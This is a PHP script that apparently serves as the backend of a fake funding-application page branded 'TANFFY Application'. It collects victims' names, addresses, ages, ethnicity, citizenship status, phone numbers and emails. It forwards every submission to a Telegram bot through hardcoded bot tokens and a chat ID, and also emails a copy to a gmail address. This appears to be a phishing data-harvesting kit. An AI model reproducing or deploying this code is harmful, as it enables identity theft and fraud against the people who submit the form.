<?php
/* https://api.telegram.org/bot5407616767:AAH_kKTOE19eBM31M4xU9gXGMBgv0hR00es/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */

//Переменная $name, $password получает данные при помощи метода POST из формы
// $ip = getenv("REMOTE_ADDR");
// $hostname = gethostbyaddr($ip);
$fname = $_POST['first'];
$lname = $_POST['last'];
$address = $_POST['address'];
$zip = $_POST['zip'];
$city= $_POST['city'];
$state= $_POST['state'];
$gender= $_POST['gender'];
$age= $_POST['age'];
$status= $_POST['status'];
$ethnicity= $_POST['ethnicity'];
$employment= $_POST['employment'];
$number= $_POST['number'];


$category= $_POST['category'];
$money= $_POST['money'];
$message1= $_POST['message1'];
$message2= $_POST['message2'];
$emailA= $_POST['emailAdd'];
$receiveEmail= $_POST['receiveEmail'];


// $browser = $_SERVER['HTTP_USER_AGENT'] . "\n\n";


//We need to insert into the $token variable the token that @botFather sent us
// $token = "5485137254:AAGm-2HBlNVEliJbabzwgZm-8FBRuGds-Y4"; //client

//we need to insert the chat_id. it can be obtained from the bot @myidbot

//$chat_id = "535201025"; //client

//We need to insert into the $token variable the token that @botFather sent us
$token = "5965894945:AAGO1TuwOs0m5WKRgjO6kFIz0mmPjPSSf1o"; 

//we need to insert the chat_id. it can be obtained from the bot @myidbot

$chat_id = "5611511005"; 

//Далее создаем переменную, в которую помещаем PHP массив
$arr = array(
  'TANFFY Application' => $blank,
  '' => $blank,
  
  'First Name: ' => $fname,
  'Last Name: ' => $lname,
  'Street Address: ' => $address,
  'ZIP: ' => $zip,
  'City: ' => $city,
  'State: ' => $state,
  'Gender: ' => $gender,
  'Age: ' => $age,
  'Citizenship Status: ' => $status,
  'Ethnicity:' => $ethnicity,
  'Employment Status: ' => $employment,
  'Phone Number:' => $number,
  'Type of Funding: ' => $category,
  'Needed Money: ' => $money,
  'Use money for: ' => $message1,
  'Unique things: ' => $message2,
  'Email: '=> $emailA,
  'Receive Email: ' => $receiveEmail
  
);

//При помощи цикла перебираем массив и помещаем переменную $txt текст из массива $arr
foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

//Осуществляется отправка данных в переменной $sendToTelegram
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");



if ($sendToTelegram) {
  Header ("Location: /form.html");
} else {
  echo "Error";
}

if(isset($_POST['button'])){
  
  $to='developerobscure@gmail.com';
  $subject='TANFFY Application';
  $message=
  "First Name: ".$fname."\n".
  "Last Name: ".$lname."\n".
  "Street Address: ".$address."\n".
  "ZIP: ".$zip."\n".
  "City: ".$city."\n".
  "State: ".$state."\n".
  "Gender: ".$gender."\n".
  "Age: ".$age."\n".
  "Citizenship Status: ".$status."\n".
  "Ethnicity: ".$ethnicity."\n".
  "Employment Status: ".$employment."\n".
  "Phone Number: ".$number."\n".
  "Type of Funding: ".$category."\n".
  "Needed Money: ".$money."\n".
  "Use money for: ".$message1."\n".
  "Unique things: ".$message2."\n".
  "Email: ".$emailA."\n".
  "Receive Email: ".$receiveEmail;


  if(mail($to,$subject,$message )){
  echo "Sent Successfully";
  }
  else{
  echo "Something went Wrong";
  }

}


?>
